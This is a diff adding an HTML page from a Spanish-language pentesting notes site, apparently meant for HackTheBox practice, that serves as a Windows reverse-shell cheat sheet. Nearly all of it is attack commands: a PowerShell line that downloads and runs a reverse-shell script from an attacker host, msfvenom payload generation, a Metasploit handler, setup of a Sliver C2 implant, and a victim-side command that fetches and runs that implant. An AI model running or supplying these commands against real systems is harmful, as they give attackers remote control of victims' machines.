@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;h3 id=&quot;windows&quot;&gt;&lt;strong&gt;Windows&lt;/strong&gt;&lt;/h3&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <h3 id="windows"><strong>Windows</strong></h3>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://LHOST:LPORT/Invoke-PowerShellTcp.ps1'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>La mejor (a poder ser, es mejor ejecutarla desde el principio así):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>LHOST <span class="nv">LPORT</span><span class="o">=</span>LPORT <span class="nt">-f</span> exe <span class="nt">-o</span> revShell.exe
+
+powershell <span class="nt">-c</span> <span class="s2">"Invoke-webrequest http://</span><span class="nv">$lhost</span><span class="s2">:</span><span class="nv">$py_http_srv_port</span><span class="s2">/</span><span class="nv">$revshell_name</span><span class="s2"> -outfile </span><span class="nv">$revshell_name</span><span class="s2">"</span>
+<span class="nb">.</span> ./revShell.exe
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler<span class="p">;</span> <span class="nb">set </span>lhost LHOST<span class="p">;</span> <span class="nb">set </span>lport LPORT<span class="p">;</span> run
+</code></pre></div></div>
+
+<h1 id="x64">x64</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>LHOST <span class="nv">LPORT</span><span class="o">=</span>LPORT <span class="nt">-f</span> exe <span class="nt">-o</span> revShell.exe
+</code></pre></div></div>
+<h1 id="x86">x86</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-a</span> x86 <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>IP <span class="nv">LPORT</span><span class="o">=</span>PORT <span class="nt">-f</span> exe <span class="nt">-o</span> revShell.exe
+</code></pre></div></div>
+
+<h1 id="sliver">Sliver</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://sliver.sh/install|sudo bash sliver
+sliver
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>generate <span class="nt">--os</span> windows <span class="nt">--arch</span> 64bit <span class="nt">--mtls</span> IP-ATACANTE <span class="nt">--reconnect</span> 60 <span class="nt">--save</span> htb.exe 
+
+mtls
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<p>En la víctima:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"wget IP-ATACANTE/htb.exe -usebasiparsing -outfile C:\users\public\music\htb.exe; C:\users\public\music\htb.exe"</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
